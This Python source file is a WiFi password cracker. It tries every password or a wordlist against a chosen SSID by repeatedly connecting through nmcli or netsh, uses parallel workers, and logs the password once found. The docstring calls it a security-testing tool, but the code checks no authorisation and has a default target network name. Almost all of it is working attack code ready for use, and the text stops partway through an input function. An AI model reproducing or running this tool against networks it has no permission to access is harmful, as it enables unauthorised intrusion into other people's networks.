#!/usr/bin/env python3
"""
WiFi Password Cracker - Enhanced Cross-Platform Version with Dictionary Attack
A tool for testing WiFi network security through brute-force and dictionary attacks.
"""

import subprocess
import requests
import itertools
import string
import argparse
import logging
import sys
import time
import signal
import platform
import os
import socket
import threading
from threading import Thread, Event, Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Optional, Tuple
from dataclasses import dataclass
from pathlib import Path

# -----------------------------
# OS Detection
# -----------------------------

def get_os_info() -> dict:
    """Detect operating system and set appropriate settings."""
    system = platform.system().lower()
    
    if system == "windows":
        return {
            'os': 'windows',
            'encoding': 'utf-8',
            'disconnect_cmd': ['netsh', 'wlan', 'disconnect'],
            'connect_cmd_base': ['netsh', 'wlan', 'connect'],
            'verify_cmd': ['netsh', 'wlan', 'show', 'interfaces'],
            'interface_keyword': 'SSID',
            'interface_name': 'Wi-Fi'
        }
    else:
        return {
            'os': 'linux',
            'encoding': 'utf-8',
            'disconnect_cmd': ['nmcli', 'dev', 'disconnect', 'wlan0'],
            'connect_cmd_base': ['nmcli', 'dev', 'wifi', 'connect'],
            'verify_cmd': ['nmcli', '-t', '-f', 'NAME,TYPE', 'connection', 'show', '--active'],
            'interface_keyword': '802-11-wireless',
            'interface_name': 'wlan0'
        }

# Global OS info
os_info = get_os_info()

# -----------------------------
# Configuration and Constants
# -----------------------------

@dataclass
class Config:
    """Configuration settings for the WiFi cracker."""
    default_ssid: str = 'SkiTheEast'
    default_password_lengths: List[int] = None
    characters: str = string.ascii_letters + string.digits + string.punctuation
    request_timeout: int = 5
    delay_between_attempts: float = 0.05
    max_workers: int = 4
    log_file: str = "wifi_cracker.log"
    batch_size: int = 1000
    max_memory_percent: int = 85
    resource_check_interval: int = 100
    check_captive_portal: bool = False
    preserve_connection: bool = False
    connection_check_timeout: int = 8  # Increased timeout
    test_connectivity: bool = True
    connection_stabilize_time: float = 3.0  # Time to wait for connection to stabilize
    verification_retries: int = 3  # Number of verification attempts
    verification_retry_delay: float = 2.0  # Delay between verification attempts
    
    def __post_init__(self):
        if self.default_password_lengths is None:
            self.default_password_lengths = [4, 5]

# Global configuration
config = Config()

# Event to handle graceful termination
terminate_event = Event()
log_lock = Lock()

# -----------------------------
# Connection Preservation
# -----------------------------

class ConnectionPreserver:
    """Manages preserving internet connection during attacks."""
    
    def __init__(self):
        self.original_connection = None
        self.backup_interface = None
        self.preservation_thread = None
        self.preserve_event = Event()
    
    def backup_current_connection(self) -> bool:
        """Backup current network configuration."""
        try:
            if os_info['os'] == 'linux':
                result = subprocess.run(
                    ['nmcli', '-t', '-f', 'NAME,TYPE,DEVICE', 'connection', 'show', '--active'],
                    capture_output=True, text=True, timeout=10
                )
                
                active_connections = result.stdout.strip().split('\n')
                for conn in active_connections:
                    if 'ethernet' in conn.lower() or '802-11-wireless' not in conn.lower():
                        parts = conn.split(':')
                        if len(parts) >= 3:
                            self.original_connection = parts[0]
                            self.backup_interface = parts[2]
                            with log_lock:
                                logger.info(f"[BACKUP] Found backup connection: {self.original_connection} on {self.backup_interface}")
                            return True
            
            with log_lock:
                logger.info("[BACKUP] No backup connection found - will use cellular if available")
            return False
            
        except Exception as e:
            with log_lock:
                logger.warning(f"[BACKUP] Could not backup connection: {e}")
            return False
    
    def has_multiple_interfaces(self) -> bool:
        """Check if multiple network interfaces are available."""
        try:
            if os_info['os'] == 'linux':
                result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, timeout=10)
                interfaces = [line for line in result.stdout.split('\n') if 'state UP' in line.lower()]
                return len(interfaces) > 1
            else:
                result = subprocess.run(['netsh', 'interface', 'show', 'interface'], 
                                     capture_output=True, text=True, timeout=10)
                interfaces = [line for line in result.stdout.split('\n') if 'connected' in line.lower()]
                return len(interfaces) > 1
        except:
            return False
    
    def restore_connection(self) -> None:
        """Restore original network configuration."""
        if self.original_connection and self.backup_interface:
            try:
                if os_info['os'] == 'linux':
                    subprocess.run(['nmcli', 'connection', 'up', self.original_connection], 
                                capture_output=True, timeout=10)
                    with log_lock:
                        logger.info(f"[RESTORE] Restored connection: {self.original_connection}")
            except Exception as e:
                with log_lock:
                    logger.warning(f"[RESTORE] Could not restore connection: {e}")

# -----------------------------
# Cross-Platform Logging Setup
# -----------------------------

def setup_logging(verbose: bool = False) -> None:
    """Configure logging with cross-platform Unicode support."""
    log_level = logging.DEBUG if verbose else logging.INFO
    
    log_path = Path(config.log_file)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    
    if os_info['os'] == 'windows':
        if hasattr(sys.stdout, 'reconfigure'):
            sys.stdout.reconfigure(encoding='utf-8')
        if hasattr(sys.stderr, 'reconfigure'):
            sys.stderr.reconfigure(encoding='utf-8')
        
        try:
            subprocess.run(['chcp', '65001'], shell=True, capture_output=True)
        except:
            pass
    
    class SafeFormatter(logging.Formatter):
        def format(self, record):
            if os_info['os'] == 'windows':
                message = record.getMessage()
                message = message.replace('✅', '[OK]')
                message = message.replace('❌', '[FAIL]')
                message = message.replace('⚠️', '[WARN]')
                message = message.replace('🔑', '[KEY]')
                message = message.replace('📡', '[WIFI]')
                message = message.replace('🔍', '[SEARCH]')
                message = message.replace('🎉', '[SUCCESS]')
                message = message.replace('⏱️', '[TIME]')
                message = message.replace('🔢', '[COUNT]')
                message = message.replace('🚀', '[START]')
                message = message.replace('📊', '[PROGRESS]')
                message = message.replace('🔚', '[END]')
                message = message.replace('🛑', '[STOP]')
                message = message.replace('🌐', '[URL]')
                message = message.replace('🔓', '[CRACK]')
                message = message.replace('📚', '[DICT]')
                message = message.replace('📄', '[FILE]')
                message = message.replace('💾', '[BACKUP]')
                message = message.replace('🔄', '[RESTORE]')
                message = message.replace('🔧', '[VERIFY]')
                record.msg = message
            
            return super().format(record)
    
    file_handler = logging.FileHandler(config.log_file, encoding='utf-8')
    console_handler = logging.StreamHandler(sys.stdout)
    
    formatter = SafeFormatter('%(asctime)s [%(levelname)s] %(message)s')
    file_handler.setFormatter(formatter)
    console_handler.setFormatter(formatter)
    
    logging.basicConfig(
        level=log_level,
        handlers=[file_handler, console_handler],
        force=True
    )
    
    global logger
    logger = logging.getLogger(__name__)

# -----------------------------
# Enhanced WiFi Manager
# -----------------------------

class WiFiManager:
    """Manages WiFi connections and network detection across platforms."""
    
    @staticmethod
    def connect_to_wifi(ssid: str, password: str) -> bool:
        """
        Attempts to connect to specified WiFi network with enhanced verification.
        
        Args:
            ssid: The SSID of the WiFi network
            password: The password for the WiFi network
            
        Returns:
            True if connection is successful, False otherwise
        """
        try:
            with log_lock:
                logger.debug(f"[CONNECT] Attempting connection to {ssid} with password {password}")
            
            # Disconnect from any existing connection
            disconnect_cmd = os_info['disconnect_cmd']
            subprocess.run(disconnect_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
            
            # OS-specific connection logic
            if os_info['os'] == 'windows':
                success = WiFiManager._connect_windows(ssid, password)
            else:
                success = WiFiManager._connect_linux(ssid, password)
            
            if success:
                with log_lock:
                    logger.info(f"[OK] Successfully connected to: {ssid}")
                return True
            else:
                with log_lock:
                    logger.debug(f"[FAIL] Failed to connect to: {ssid}")
                return False
            
        except subprocess.TimeoutExpired:
            with log_lock:
                logger.debug("[TIME] Connection attempt timed out")
            return False
        except Exception as e:
            with log_lock:
                logger.error(f"[WARN] Unexpected error: {e}")
            return False
    
    @staticmethod
    def _connect_linux(ssid: str, password: str) -> bool:
        """Linux-specific connection with enhanced verification."""
        try:
            # Build connection command
            connect_cmd = os_info['connect_cmd_base'] + [ssid, 'password', password]
            
            with log_lock:
                logger.debug(f"[CONNECT] Running command: {' '.join(connect_cmd)}")
            
            # Run connection command
            result = subprocess.run(
                connect_cmd, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE,
                timeout=15
            )
            
            with log_lock:
                logger.debug(f"[CONNECT] Command return code: {result.returncode}")
                if result.stderr:
                    logger.debug(f"[CONNECT] Command stderr: {result.stderr.decode('utf-8', errors='ignore')}")
                if result.stdout:
                    logger.debug(f"[CONNECT] Command stdout: {result.stdout.decode('utf-8', errors='ignore')}")
            
            # Check if command executed successfully
            if result.returncode != 0:
                with log_lock:
                    logger.debug(f"[FAIL] Connection command failed with return code {result.returncode}")
                return False
            
            # Wait for connection to stabilize
            with log_lock:
                logger.debug(f"[VERIFY] Waiting {config.connection_stabilize_time}s for connection to stabilize...")
            time.sleep(config.connection_stabilize_time)
            
            # Enhanced verification with retries
            for attempt in range(config.verification_retries):
                with log_lock:
                    logger.debug(f"[VERIFY] Verification attempt {attempt + 1}/{config.verification_retries}")
                
                if WiFiManager.verify_connection_enhanced(ssid):
                    with log_lock:
                        logger.debug(f"[VERIFY] Verification successful on attempt {attempt + 1}")
                    return True
                
                if attempt < config.verification_retries - 1:
                    with log_lock:
                        logger.debug(f"[VERIFY] Waiting {config.verification_retry_delay}s before retry...")
                    time.sleep(config.verification_retry_delay)
            
            with log_lock:
                logger.debug(f"[FAIL] All {config.verification_retries} verification attempts failed")
            return False
            
        except Exception as e:
            with log_lock:
                logger.debug(f"[CONNECT] Linux connection error: {e}")
            return False
    
    @staticmethod
    def verify_connection_enhanced(ssid: str) -> bool:
        """
        Enhanced connection verification with multiple methods and detailed debugging.
        
        Args:
            ssid: Expected SSID
            
        Returns:
            True if actually connected to the correct network, False otherwise
        """
        try:
            with log_lock:
                logger.debug(f"[VERIFY] Starting enhanced verification for {ssid}")
            
            # Method 1: Check network manager status
            if os_info['os'] == 'windows':
                result = subprocess.run(
                    os_info['verify_cmd'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=10
                )
                
                output = result.stdout
                with log_lock:
                    logger.debug(f"[VERIFY] Windows netsh output: {output}")
                
                if ssid not in output or "connected" not in output.lower():
                    with log_lock:
                        logger.debug(f"[VERIFY] Windows verification failed - SSID not found or not connected")
                    return False
                
                # Method 2: Check IP address assignment
                ip_result = subprocess.run(['ipconfig'], capture_output=True, text=True, timeout=10)
                if "192.168." not in ip_result.stdout and "10.0." not in ip_result.stdout:
                    with log_lock:
                        logger.debug(f"[VERIFY] No valid IP address found")
                    return False
                    
            else:
                # Linux verification
                result = subprocess.run(
                    os_info['verify_cmd'],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=10
                )
                
                output = result.stdout
                with log_lock:
                    logger.debug(f"[VERIFY] Linux nmcli output: {output}")
                
                active_connections = output.strip().split('\n')
                found_connection = False
                
                for conn in active_connections:
                    if ssid in conn and os_info['interface_keyword'] in conn:
                        found_connection = True
                        with log_lock:
                            logger.debug(f"[VERIFY] Found matching connection: {conn}")
                        break
                
                if not found_connection:
                    with log_lock:
                        logger.debug(f"[VERIFY] Linux verification failed - no matching connection found")
                    return False
                
                # Method 2: Check IP address assignment
                ip_result = subprocess.run(['ip', 'addr', 'show', os_info['interface_name']], 
                                        capture_output=True, text=True, timeout=10)
                with log_lock:
                    logger.debug(f"[VERIFY] IP address output: {ip_result.stdout}")
                
                if "inet " not in ip_result.stdout:
                    with log_lock:
                        logger.debug(f"[VERIFY] No IP address assigned to interface")
                    return False
            
            # Method 3: Test actual connectivity
            if config.test_connectivity:
                with log_lock:
                    logger.debug(f"[VERIFY] Testing actual network connectivity...")
                if WiFiManager._test_connectivity():
                    with log_lock:
                        logger.debug(f"[VERIFY] Connectivity test successful")
                    return True
                else:
                    with log_lock:
                        logger.debug(f"[VERIFY] Connectivity test failed")
                    return False
            
            with log_lock:
                logger.debug(f"[VERIFY] Basic verification successful")
            return True
            
        except Exception as e:
            with log_lock:
                logger.debug(f"[VERIFY] Verification error: {e}")
            return False
    
    @staticmethod
    def _test_connectivity() -> bool:
        """Test actual network connectivity with multiple methods."""
        try:
            # Method 1: DNS resolution test
            with log_lock:
                logger.debug(f"[VERIFY] Testing DNS resolution...")
            sock = socket.create_connection(("8.8.8.8", 53), timeout=3)
            sock.close()
            with log_lock:
                logger.debug(f"[VERIFY] DNS test successful")
            return True
        except:
            try:
                # Method 2: HTTP test
                with log_lock:
                    logger.debug(f"[VERIFY] Testing HTTP connectivity...")
                response = requests.get("http://httpbin.org/ip", timeout=3)
                if response.status_code == 200:
                    with log_lock:
                        logger.debug(f"[VERIFY] HTTP test successful")
                    return True
            except:
                pass
        
        with log_lock:
            logger.debug(f"[VERIFY] All connectivity tests failed")
        return False
    
    @staticmethod
    def _connect_windows(ssid: str, password: str) -> bool:
        """Windows-specific WiFi connection logic with enhanced verification."""
        try:
            # Create temporary XML profile for Windows
            profile_xml = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
            
            # Write profile to temporary file
            profile_file = f"temp_wifi_profile_{int(time.time())}.xml"
            with open(profile_file, 'w', encoding='utf-8') as f:
                f.write(profile_xml)
            
            try:
                # Add profile
                add_cmd = ['netsh', 'wlan', 'add', 'profile', f'filename="{profile_file}"']
                result = subprocess.run(add_cmd, capture_output=True, timeout=10)
                with log_lock:
                    logger.debug(f"[CONNECT] Profile add return code: {result.returncode}")
                
                # Connect
                connect_cmd = ['netsh', 'wlan', 'connect', f'name="{ssid}"']
                result = subprocess.run(connect_cmd, capture_output=True, timeout=15)
                with log_lock:
                    logger.debug(f"[CONNECT] Connect return code: {result.returncode}")
                    if result.stderr:
                        logger.debug(f"[CONNECT] Connect stderr: {result.stderr.decode('utf-8', errors='ignore')}")
                
                # Wait for connection to stabilize
                with log_lock:
                    logger.debug(f"[VERIFY] Waiting {config.connection_stabilize_time}s for connection to stabilize...")
                time.sleep(config.connection_stabilize_time)
                
                # Enhanced verification with retries
                for attempt in range(config.verification_retries):
                    with log_lock:
                        logger.debug(f"[VERIFY] Verification attempt {attempt + 1}/{config.verification_retries}")
                    
                    if WiFiManager.verify_connection_enhanced(ssid):
                        with log_lock:
                            logger.debug(f"[VERIFY] Verification successful on attempt {attempt + 1}")
                        return True
                    
                    if attempt < config.verification_retries - 1:
                        with log_lock:
                            logger.debug(f"[VERIFY] Waiting {config.verification_retry_delay}s before retry...")
                        time.sleep(config.verification_retry_delay)
                
                return False
                    
            finally:
                # Ensure cleanup
                try:
                    if os.path.exists(profile_file):
                        os.remove(profile_file)
                    subprocess.run(['netsh', 'wlan', 'delete', 'profile', f'name="{ssid}"'], 
                                 capture_output=True, timeout=5)
                except:
                    pass
                    
        except Exception as e:
            with log_lock:
                logger.debug(f"[CONNECT] Windows connection error: {e}")
            return False
    
    @staticmethod
    def detect_login_url() -> Optional[str]:
        """Detects captive portal login URL by checking for redirects."""
        if not config.check_captive_portal:
            with log_lock:
                logger.debug("[SEARCH] Captive portal detection disabled")
            return None
        
        test_urls = [
            "http://www.google.com",
            "http://httpbin.org/redirect/1",
            "http://example.com"
        ]
        
        with log_lock:
            logger.debug("[SEARCH] Checking for captive portal...")
        
        for test_url in test_urls:
            try:
                response = requests.get(
                    test_url, 
                    allow_redirects=True, 
                    timeout=config.request_timeout
                )
                
                if response.history:
                    login_url = response.url
                    with log_lock:
                        logger.info(f"[SEARCH] Detected captive portal: {login_url}")
                    return login_url
                    
            except requests.RequestException:
                continue
        
        with log_lock:
            logger.debug("[SEARCH] No captive portal detected (normal for WPA2 networks)")
        return None
    
    @staticmethod
    def verify_connection(ssid: str) -> bool:
        """Legacy verification method - kept for compatibility."""
        return WiFiManager.verify_connection_enhanced(ssid)

# -----------------------------
# Password Generation and Dictionary Loading
# -----------------------------

class PasswordGenerator:
    """Generates password combinations for brute-force attacks."""
    
    @staticmethod
    def generate_combinations(length: int, charset: str = None) -> itertools.product:
        """Generates all possible combinations of specified length."""
        if charset is None:
            charset = config.characters
        return itertools.product(charset, repeat=length)
    
    @staticmethod
    def estimate_combinations(lengths: List[int], charset: str = None) -> int:
        """Estimates total number of password combinations."""
        if charset is None:
            charset = config.characters
        
        total = 0
        for length in lengths:
            total += len(charset) ** length
        return total

class DictionaryLoader:
    """Loads and manages password dictionaries for dictionary attacks."""
    
    @staticmethod
    def load_dictionary(file_path: str) -> List[str]:
        """Loads passwords from a dictionary file."""
        passwords = []
        file_path = Path(file_path)
        
        if not file_path.exists():
            raise FileNotFoundError(f"Dictionary file not found: {file_path}")
        
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line_num, line in enumerate(f, 1):
                    password = line.strip()
                    if password:
                        passwords.append(password)
                    
                    if line_num % 10000 == 0:
                        with log_lock:
                            logger.debug(f"[DICT] Loaded {line_num:,} passwords...")
        
        except UnicodeDecodeError:
            for encoding in ['latin1', 'cp1252', 'utf-16']:
                try:
                    with open(file_path, 'r', encoding=encoding, errors='ignore') as f:
                        for line_num, line in enumerate(f, 1):
                            password = line.strip()
                            if password:
                                passwords.append(password)
                    with log_lock:
                        logger.info(f"[DICT] Successfully loaded with {encoding} encoding")
                    break
                except:
                    continue
            else:
                raise UnicodeDecodeError(f"Could not decode file {file_path} with any encoding")
        
        with log_lock:
            logger.info(f"[DICT] Loaded {len(passwords):,} passwords from {file_path.name}")
        
        return passwords
    
    @staticmethod
    def validate_dictionary(file_path: str) -> Tuple[bool, str]:
        """Validates if a dictionary file is readable and has passwords."""
        try:
            file_path = Path(file_path)
            
            if not file_path.exists():
                return False, f"File not found: {file_path}"
            
            if not file_path.is_file():
                return False, f"Path is not a file: {file_path}"
            
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    first_lines = [f.readline().strip() for _ in range(5)]
                    if not any(first_lines):
                        return False, "File appears to be empty"
            except Exception as e:
                return False, f"Error reading file: {e}"
            
            return True, "Dictionary file is valid"
            
        except Exception as e:
            return False, f"Validation error: {e}"

# -----------------------------
# Resource Monitoring
# -----------------------------

import psutil

def check_system_resources() -> bool:
    """Check if system resources are critically low."""
    try:
        memory = psutil.virtual_memory()
        if memory.percent > config.max_memory_percent:
            with log_lock:
                logger.warning(f"[WARN] High memory usage: {memory.percent}% - Pausing...")
            return False
        
        cpu = psutil.cpu_percent(interval=1)
        if cpu > 90:
            with log_lock:
                logger.warning(f"[WARN] High CPU usage: {cpu}% - Pausing...")
            return False
            
        return True
    except Exception:
        return True

# -----------------------------
# Cracking Engine
# -----------------------------

class WiFiCracker:
    """Main password cracking engine with enhanced verification."""
    
    def __init__(self, ssid: str, mode: str = 'brute', password_lengths: List[int] = None, dictionary_file: str = None):
        self.ssid = ssid
        self.mode = mode
        self.password_lengths = password_lengths or [4, 5]
        self.dictionary_file = dictionary_file
        self.wifi_manager = WiFiManager()
        self.password_generator = PasswordGenerator()
        self.dictionary_loader = DictionaryLoader()
        self.attempts = 0
        self.start_time = None
        self.passwords = []
        self.connection_preserver = ConnectionPreserver()
        
        if self.mode == 'dictionary':
            self._load_dictionary()
        
        if config.preserve_connection:
            self.connection_preserver.backup_current_connection()
    
    def _load_dictionary(self) -> None:
        """Load passwords from dictionary file."""
        if not self.dictionary_file:
            raise ValueError("Dictionary file path is required for dictionary mode")
        
        try:
            self.passwords = self.dictionary_loader.load_dictionary(self.dictionary_file)
            with log_lock:
                logger.info(f"[DICT] Dictionary attack mode with {len(self.passwords):,} passwords")
        except Exception as e:
            with log_lock:
                logger.error(f"[FAIL] Failed to load dictionary: {e}")
            raise
    
    def try_password(self, password: str) -> Tuple[bool, Optional[str]]:
        """Attempts to connect using a single password with enhanced verification."""
        if terminate_event.is_set():
            return False, None
            
        self.attempts += 1
        
        if self.attempts % config.resource_check_interval == 0:
            if not check_system_resources():
                time.sleep(2)
        
        with log_lock:
            logger.debug(f"[KEY] Attempt {self.attempts}: {password}")
        
        success = self.wifi_manager.connect_to_wifi(self.ssid, password)
        
        if success:
            # Enhanced verification already done in connect_to_wifi
            login_url = self.wifi_manager.detect_login_url() if config.check_captive_portal else None
            return True, login_url
        
        time.sleep(config.delay_between_attempts)
        return False, None
    
    def crack_dictionary_parallel(self) -> Optional[Tuple[str, Optional[str]]]:
        """Attempts to crack passwords using dictionary attack with parallel processing."""
        self.start_time = time.time()
        
        with log_lock:
            logger.info(f"[CRACK] WiFi Dictionary Attack Started")
            logger.info(f"[WIFI] Target SSID: {self.ssid}")
            logger.info(f"[DICT] Dictionary file: {self.dictionary_file}")
            logger.info(f"[COUNT] Total passwords: {len(self.passwords):,}")
            logger.info(f"[START] Starting parallel dictionary attack with {config.max_workers} workers...")
        
        with ThreadPoolExecutor(max_workers=config.max_workers) as executor:
            password_batch = []
            batch_count = 0
            
            for password in self.passwords:
                if terminate_event.is_set():
                    break
                    
                password_batch.append(password)
                
                if len(password_batch) >= config.batch_size:
                    batch_count += 1
                    
                    futures = {
                        executor.submit(self.try_password, pwd): pwd 
                        for pwd in password_batch
                    }
                    
                    for future in as_completed(futures):
                        if terminate_event.is_set():
                            break
                            
                        success, login_url = future.result()
                        if success:
                            elapsed = time.time() - self.start_time
                            with log_lock:
                                logger.info(f"[SUCCESS] Password found: {futures[future]}")
                                logger.info(f"[TIME] Time elapsed: {elapsed:.2f} seconds")
                                logger.info(f"[COUNT] Total attempts: {self.attempts}")
                                if login_url:
                                    logger.info(f"[URL] Login URL: {login_url}")
                            return futures[future], login_url
                    
                    password_batch.clear()
                    
                    if batch_count % 10 == 0:
                        processed = min(batch_count * config.batch_size, len(self.passwords))
                        with log_lock:
                            logger.info(f"[PROGRESS] Processed {processed:,} of {len(self.passwords):,} passwords...")
                    
                    time.sleep(0.1)
            
            if password_batch and not terminate_event.is_set():
                futures = {
                    executor.submit(self.try_password, pwd): pwd 
                    for pwd in password_batch
                }
                
                for future in as_completed(futures):
                    if terminate_event.is_set():
                        break
                        
                    success, login_url = future.result()
                    if success:
                        elapsed = time.time() - self.start_time
                        with log_lock:
                            logger.info(f"[SUCCESS] Password found: {futures[future]}")
                            logger.info(f"[TIME] Time elapsed: {elapsed:.2f} seconds")
                            logger.info(f"[COUNT] Total attempts: {self.attempts}")
                            if login_url:
                                logger.info(f"[URL] Login URL: {login_url}")
                        return futures[future], login_url
        
        return None
    
    def crack_dictionary_sequential(self) -> Optional[Tuple[str, Optional[str]]]:
        """Attempts to crack passwords using sequential dictionary attack."""
        self.start_time = time.time()
        
        with log_lock:
            logger.info(f"[CRACK] WiFi Dictionary Attack Started (Sequential Mode)")
            logger.info(f"[WIFI] Target SSID: {self.ssid}")
            logger.info(f"[DICT] Dictionary file: {self.dictionary_file}")
            logger.info(f"[COUNT] Total passwords: {len(self.passwords):,}")
        
        for password in self.passwords:
            if terminate_event.is_set():
                break
                
            success, login_url = self.try_password(password)
            
            if success:
                elapsed = time.time() - self.start_time
                with log_lock:
                    logger.info(f"[SUCCESS] Password found: {password}")
                    logger.info(f"[TIME] Time elapsed: {elapsed:.2f} seconds")
                    logger.info(f"[COUNT] Total attempts: {self.attempts}")
                    if login_url:
                        logger.info(f"[URL] Login URL: {login_url}")
                return password, login_url
            
            if self.attempts % 1000 == 0:
                with log_lock:
                    logger.info(f"[PROGRESS] Tried {self.attempts:,} passwords...")
        
        return None
    
    def crack_passwords_parallel(self) -> Optional[Tuple[str, Optional[str]]]:
        """Attempts to crack passwords using parallel brute-force processing."""
        self.start_time = time.time()
        total_combinations = self.password_generator.estimate_combinations(
            self.password_lengths, config.characters
        )
        
        with log_lock:
            logger.info(f"[CRACK] WiFi Password Cracker Started")
            logger.info(f"[WIFI] Target SSID: {self.ssid}")
            logger.info(f"[KEY] Password Lengths: {self.password_lengths}")
            logger.info(f"[COUNT] Total Combinations: {total_combinations:,}")
            logger.info(f"[START] Starting parallel brute-force with {config.max_workers} workers...")
        
        with ThreadPoolExecutor(max_workers=config.max_workers) as executor:
            for length in self.password_lengths:
                if terminate_event.is_set():
                    break
                    
                with log_lock:
                    logger.info(f"[SEARCH] Trying passwords of length: {length}")
                
                password_batch = []
                batch_count = 0
                
                for combo in self.password_generator.generate_combinations(length):
                    if terminate_event.is_set():
                        break
                        
                    password = ''.join(combo)
                    password_batch.append(password)
                    
                    if len(password_batch) >= config.batch_size:
                        batch_count += 1
                        
                        futures = {
                            executor.submit(self.try_password, pwd): pwd 
                            for pwd in password_batch
                        }
                        
                        for future in as_completed(futures):
                            if terminate_event.is_set():
                                break
                                
                            success, login_url = future.result()
                            if success:
                                elapsed = time.time() - self.start_time
                                with log_lock:
                                    logger.info(f"[SUCCESS] Password found: {futures[future]}")
                                    logger.info(f"[TIME] Time elapsed: {elapsed:.2f} seconds")
                                    logger.info(f"[COUNT] Total attempts: {self.attempts}")
                                    if login_url:
                                        logger.info(f"[URL] Login URL: {login_url}")
                                return futures[future], login_url
                        
                        password_batch.clear()
                        
                        if batch_count % 10 == 0:
                            with log_lock:
                                logger.info(f"[PROGRESS] Processed {batch_count * config.batch_size:,} passwords...")
                        
                        time.sleep(0.1)
                
                if password_batch and not terminate_event.is_set():
                    futures = {
                        executor.submit(self.try_password, pwd): pwd 
                        for pwd in password_batch
                    }
                    
                    for future in as_completed(futures):
                        if terminate_event.is_set():
                            break
                            
                        success, login_url = future.result()
                        if success:
                            elapsed = time.time() - self.start_time
                            with log_lock:
                                logger.info(f"[SUCCESS] Password found: {futures[future]}")
                                logger.info(f"[TIME] Time elapsed: {elapsed:.2f} seconds")
                                logger.info(f"[COUNT] Total attempts: {self.attempts}")
                                if login_url:
                                    logger.info(f"[URL] Login URL: {login_url}")
                            return futures[future], login_url
        
        return None
    
    def crack_passwords_sequential(self) -> Optional[Tuple[str, Optional[str]]]:
        """Attempts to crack passwords sequentially."""
        self.start_time = time.time()
        
        with log_lock:
            logger.info(f"[CRACK] WiFi Password Cracker Started (Sequential Mode)")
            logger.info(f"[WIFI] Target SSID: {self.ssid}")
            logger.info(f"[KEY] Password Lengths: {self.password_lengths}")
        
        for length in self.password_lengths:
            if terminate_event.is_set():
                break
                
            with log_lock:
                logger.info(f"[SEARCH] Trying passwords of length: {length}")
            
            for combo in self.password_generator.generate_combinations(length):
                if terminate_event.is_set():
                    break
                    
                password = ''.join(combo)
                success, login_url = self.try_password(password)
                
                if success:
                    elapsed = time.time() - self.start_time
                    with log_lock:
                        logger.info(f"[SUCCESS] Password found: {password}")
                        logger.info(f"[TIME] Time elapsed: {elapsed:.2f} seconds")
                        logger.info(f"[COUNT] Total attempts: {self.attempts}")
                        if login_url:
                            logger.info(f"[URL] Login URL: {login_url}")
                    return password, login_url
        
        return None

# -----------------------------
# Interactive Input Functions
# -----------------------------

def get_attack_mode() -> Tuple[str, Optional[str]]:
    """Interactive prompt for user to select attack mode."""
    print("\n" + "="*60)
    print("ATTACK MODE SELECTION")
    print("="*60)
    print("Choose your attack method:")
    print("1. Brute Force - Try all possible combinations")
    print("2. Dictionary Attack - Use a password list\n")
    
    while True:
        choice = input("Select attack mode (1/2): ").strip()
        
        if choice == '1':
            return 'brute', None
        elif choice == '2':
            return get_dictionary_file()
        else:
            print("❌ Invalid choice. Please enter 1 or 2.")

def get_dictionary_file() -> Tuple[str, str]:
    """Interactive prompt for user to input dictionary file path."""
    print("\n" + "="*60)
    print("DICTIONARY FILE SELECTION")
    print("="*60)
    print("Enter the path to your password dictionary file.")
    print("Examples: pw.txt, passwords.txt, rockyou.txt, wordlist.txt")
    print("The file should be in the same directory as this script or provide full path.\n")
    
    while True:
        file_path = input("📄 Enter dictionary file path: ").strip()
        
        if not file_path:
            print("❌ File path cannot be empty. Please try again.")
            continue
        
        is_valid, message = DictionaryLoader.validate_dictionary(file_path)
        
        if not is_valid:
            print(f"❌ {message}")
            print("Please check the file path and try again.")
            continue
        
        try:
            file_path_obj = Path(file_path)
            file_size = file_path_obj.stat().st_size
            print(f"\n📚 Dictionary file: {file_path_obj.name}")
            print(f"📊 File size: {file_size:,} bytes")
            
            try:
                with open(file_path_obj, 'r', encoding='utf-8', errors='ignore') as f:
                    sample_count = sum(1 for _ in itertools.islice(f, 1000) if _.strip())
                    if sample_count == 1000:
                        print(f"🔢 Password count: 1000+ (showing first 1000)")
                    else:
                        print(f"🔢 Password count: {sample_count}")
            except:
                print("🔢 Password count: Unable to determine")
            
            print(f"✅ {message}")
            
            confirm = input("Use this dictionary file? (y/n): ").strip().lower()
            if confirm in ['y', 'yes']:
                return 'dictionary', file_path
            elif confirm in ['n', 'no']:
                print("Let's try another file...")
            else:
                print("Invalid input. Please enter 'y' or 'n'.")
                
        except Exception as e:
            print(f"❌ Error accessing file: {e}")
            continue

def get_target_ssid() -> str:
    """Interactive prompt for user to input target SSID."""
    print("\n" + "="*60)
    print("TARGET SELECTION")
    print("="*60)
    print("Please enter the SSID of the WiFi network you want to test.")
    print("This should be the exact network name as it appears in your WiFi list.\n")
    
    while True:
        ssid = input("📡 Enter target SSID: ").strip()
        
        if not ssid:
            print("❌ SSID cannot be empty. Please try again.")
            continue
        
        print(f"\n🔍 You selected: '{ssid}'")
        confirm = input("Is this correct? (y/n): ").strip().lower()
        
        if confirm in ['y', 'yes']:
            return ssid
        elif confirm in ['n', 'no']:
            print("Let's try again...")
        else:
            print("Invalid input. Please enter 'y' or 'n'.")

def get_password_lengths() -> List[int]:
    """Interactive prompt for user to input password lengths."""
    print("\n" + "="*60)
    print("PASSWORD LENGTH CONFIGURATION")
    print("="*60)
    print("Enter the password lengths you want to test (space-separated).")
    print("Example: 4 5 6 will test all 4, 5, and 6 character passwords\n")
    
    while True:
